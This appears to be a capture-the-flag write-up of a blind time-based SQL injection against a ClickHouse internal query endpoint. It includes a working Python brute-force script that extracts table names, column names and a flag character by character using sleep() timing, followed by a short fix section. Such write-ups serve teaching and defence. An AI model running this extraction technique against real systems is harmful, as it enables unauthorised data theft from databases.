# sqli101 - part 3

## Vulnerability
Unescaped user inputs used in the following SQL query.
```js
db.testQueryInBlind(query)
```

## Exploitation
We can run whatever query we are interested in, but we do not see the result of our query.
Our goal will be to guess / bruteforce the data one character at a time. To detect our guess is right we will leverage the `sleep(seconds)` function available in ClickHouse to increase the query duration.

The bruteforce part can be harmonized in a method, leading to a small Python script.
Note: We could also play with the LIMIT/OFFSET to list multiple tables and columns.
```python
import requests
import string

def brute(column_name, table, where_cond = ''):
  where_clause = 'WHERE ' + where_cond if where_cond else ''

  value = ''
  found = True
  while found:
    found = False
    for c in (string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}$!?"):
      query = f"SELECT if(startsWith({column_name}, '{value + c}'), sleep(0.1), 1) FROM {table} {where_clause} LIMIT 1 OFFSET 0"
      response = requests.post('http://localhost:80/internal/test_query_validity', json={'query': query})

      if response.elapsed.total_seconds() >= 0.1:
        value += c
        found = True
        break

  return value

table = brute('name', 'system.tables', "database = 'default'")
print(f"Table found: {table}")

column = brute('name', 'system.columns', f"database = 'default' and table = '{table}'")
print(f"Column found: {column}")

flag = brute(column, f"default.{table}")
print(f"Flag: {flag}")
```

## Fix
Internal API must never be available openly in prod.
Finding weird URL names is not a fix.

The quickest fix is to delete the code.
But if we want to keep the "feature", it should be behind a login page where only internal users can connect to.
